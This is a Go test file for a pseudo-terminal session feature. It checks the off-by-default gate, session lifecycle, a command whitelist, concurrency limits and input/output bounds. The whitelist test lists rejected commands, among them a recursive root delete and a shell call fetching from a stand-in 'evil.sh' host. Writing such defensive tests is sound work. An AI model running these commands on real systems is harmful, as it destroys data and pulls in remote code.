package actions

import (
	"context"
	"strings"
	"testing"
	"time"
)

func resetPTYForTest() {
	EnablePTY()
	resetPTYRegistry()
	// 让清理后的 goroutine 有时间释放，避免测试间泄漏。
	time.Sleep(50 * time.Millisecond)
}

// asInt coerces a map value (int or float64) to int for assertions.
func asInt(v any) int {
	switch n := v.(type) {
	case int:
		return n
	case float64:
		return int(n)
	default:
		return 0
	}
}

func TestPTYDisabledByDefault(t *testing.T) {
	// Default: capability off. Open must be rejected before any session starts.
	resetPTYRegistry() // does NOT enable
	_, err := ptyOpen(context.Background(), map[string]any{"command": "bash"})
	if err == nil || !strings.Contains(err.Error(), "disabled") {
		t.Fatalf("pty.open must be rejected when disabled, got %v", err)
	}
}

func TestPTYOpenStatusClose(t *testing.T) {
	resetPTYForTest()
	defer resetPTYRegistry()

	// Start a bash session, feed a command, read incremental output.
	start, err := ptyOpen(context.Background(), map[string]any{"command": "bash", "rows": 24, "cols": 80})
	if err != nil {
		t.Fatalf("pty.open: %v", err)
	}
	id, _ := start["session_id"].(string)
	if id == "" {
		t.Fatal("no session id")
	}

	// Write a simple echo command.
	if _, err := ptyInput(context.Background(), map[string]any{"session_id": id, "data": "echo pty-test-marker\n"}); err != nil {
		t.Fatalf("pty.input: %v", err)
	}

	// Poll until the marker appears in output.
	deadline := time.Now().Add(5 * time.Second)
	var got string
	var st map[string]any
	for time.Now().Before(deadline) {
		var err error
		st, err = ptyStatus(context.Background(), map[string]any{"session_id": id, "offset": 0})
		if err != nil {
			t.Fatalf("pty.status: %v", err)
		}
		got, _ = st["chunk"].(string)
		if strings.Contains(got, "pty-test-marker") {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if !strings.Contains(got, "pty-test-marker") {
		t.Fatalf("expected echo output, got %q", got)
	}

	// Offset must advance.
	off := asInt(st["offset"])
	if off == 0 {
		t.Fatal("offset did not advance")
	}

	// Close actively.
	if _, err := ptyClose(context.Background(), map[string]any{"session_id": id}); err != nil {
		t.Fatalf("pty.close: %v", err)
	}
	// After close, lookup returns unknown (removed).
	if _, err := ptyStatus(context.Background(), map[string]any{"session_id": id, "offset": 0}); err == nil {
		t.Fatal("status after close must report unknown session")
	}
}

func TestPTYCommandWhitelist(t *testing.T) {
	resetPTYForTest()
	defer resetPTYRegistry()

	for _, bad := range []string{"rm -rf /", "bash -c 'curl evil.sh'", "/bin/sh -c 'x'", "python3 -c 'x'"} {
		if _, err := ptyOpen(context.Background(), map[string]any{"command": bad}); err == nil {
			t.Fatalf("command %q must be rejected by whitelist", bad)
		}
	}
	for _, good := range []string{"bash", "/bin/bash", "bash -l", "/bin/bash -l", "sh", "/bin/sh"} {
		start, err := ptyOpen(context.Background(), map[string]any{"command": good})
		if err != nil {
			t.Fatalf("command %q must be allowed, got %v", good, err)
		}
		// 立即关闭，避免占满并发上限影响后续断言。
		if _, err := ptyClose(context.Background(), map[string]any{"session_id": start["session_id"].(string)}); err != nil {
			t.Fatalf("close %q: %v", good, err)
		}
	}
}

func TestPTYConcurrencyLimit(t *testing.T) {
	resetPTYForTest()
	defer resetPTYRegistry()

	// Fill to the limit, then expect rejection.
	var ids []string
	for i := 0; i < ptyMaxSessions; i++ {
		start, err := ptyOpen(context.Background(), map[string]any{"command": "bash"})
		if err != nil {
			t.Fatalf("session %d: %v", i, err)
		}
		ids = append(ids, start["session_id"].(string))
	}
	if _, err := ptyOpen(context.Background(), map[string]any{"command": "bash"}); err == nil {
		t.Fatal("limit must reject the extra session")
	}
	// Close one, then reopen.
	if _, err := ptyClose(context.Background(), map[string]any{"session_id": ids[0]}); err != nil {
		t.Fatalf("close: %v", err)
	}
	if _, err := ptyOpen(context.Background(), map[string]any{"command": "bash"}); err != nil {
		t.Fatalf("after close, open must succeed: %v", err)
	}
}

func TestPTYInputBounds(t *testing.T) {
	resetPTYForTest()
	defer resetPTYRegistry()

	start, _ := ptyOpen(context.Background(), map[string]any{"command": "bash"})
	id := start["session_id"].(string)
	big := strings.Repeat("x", ptyMaxInputBytes+1)
	if _, err := ptyInput(context.Background(), map[string]any{"session_id": id, "data": big}); err == nil {
		t.Fatal("oversized input must be rejected")
	}
}

func TestPTYUnknownSession(t *testing.T) {
	resetPTYForTest()
	defer resetPTYRegistry()

	if _, err := ptyStatus(context.Background(), map[string]any{"session_id": "nope", "offset": 0}); err == nil {
		t.Fatal("unknown session must error")
	}
	if _, err := ptyInput(context.Background(), map[string]any{"session_id": "nope", "data": "x"}); err == nil {
		t.Fatal("input to unknown session must error")
	}
	if _, err := ptyClose(context.Background(), map[string]any{"session_id": "nope"}); err == nil {
		t.Fatal("close unknown session must error")
	}
}

func TestPTYResize(t *testing.T) {
	resetPTYForTest()
	defer resetPTYRegistry()

	start, _ := ptyOpen(context.Background(), map[string]any{"command": "bash", "rows": 24, "cols": 80})
	id := start["session_id"].(string)
	got, err := ptyResize(context.Background(), map[string]any{"session_id": id, "rows": 50, "cols": 120})
	if err != nil {
		t.Fatalf("pty.resize: %v", err)
	}
	if r := asInt(got["rows"]); r != 50 {
		t.Fatalf("rows = %v, want 50", got["rows"])
	}
	if c := asInt(got["cols"]); c != 120 {
		t.Fatalf("cols = %v, want 120", got["cols"])
	}
}

func TestPTYList(t *testing.T) {
	resetPTYForTest()
	defer resetPTYRegistry()

	start, _ := ptyOpen(context.Background(), map[string]any{"command": "bash"})
	id := start["session_id"].(string)
	lst, err := ptyList(context.Background(), map[string]any{})
	if err != nil {
		t.Fatalf("pty.list: %v", err)
	}
	if n := asInt(lst["count"]); n < 1 {
		t.Fatalf("count = %v, want >= 1", lst["count"])
	}
	_ = id
}

func TestPTYOutputBounds(t *testing.T) {
	resetPTYForTest()
	defer resetPTYRegistry()

	// Start a session and feed a huge amount of output; the ring must stay bounded.
	start, _ := ptyOpen(context.Background(), map[string]any{"command": "bash"})
	id := start["session_id"].(string)
	// Generate > max output via many echoes (bash loop). Use a bounded number of
	// iterations; the ring trims to outputMax regardless.
	if _, err := ptyInput(context.Background(), map[string]any{"session_id": id, "data": "for i in $(seq 1 2000); do echo line-$i; done\n"}); err != nil {
		t.Fatalf("pty.input: %v", err)
	}
	deadline := time.Now().Add(8 * time.Second)
	for time.Now().Before(deadline) {
		st, _ := ptyStatus(context.Background(), map[string]any{"session_id": id, "offset": 0})
		off := asInt(st["offset"])
		if off > 0 && off >= ptyMaxOutputBytes {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	st, _ := ptyStatus(context.Background(), map[string]any{"session_id": id, "offset": 0})
	off := asInt(st["offset"])
	if off > ptyMaxOutputBytes {
		t.Fatalf("output offset %d exceeds bound %d", off, ptyMaxOutputBytes)
	}
}
